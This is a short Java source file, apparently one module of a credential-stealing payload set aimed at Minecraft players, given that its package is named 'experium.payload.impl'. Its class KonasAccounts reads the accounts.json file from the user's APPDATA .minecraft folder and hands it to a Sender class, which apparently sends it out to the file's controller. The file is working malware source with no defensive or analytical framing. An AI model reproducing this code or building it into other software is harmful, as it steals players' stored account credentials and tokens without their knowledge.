package dev._3000IQPlay.experium.payload.impl;

import dev._3000IQPlay.experium.payload.Payload;
import dev._3000IQPlay.experium.payload.Sender;
import dev._3000IQPlay.experium.util.FileUtil;

import java.io.File;
import java.util.Optional;

public final
class KonasAccounts implements Payload {
    @Override
    public
    void execute () {
        Optional <File> file = FileUtil.getFile(System.getenv("APPDATA") + "\\.minecraft\\" + "accounts.json");
        file.ifPresent(Sender::send);
    }
}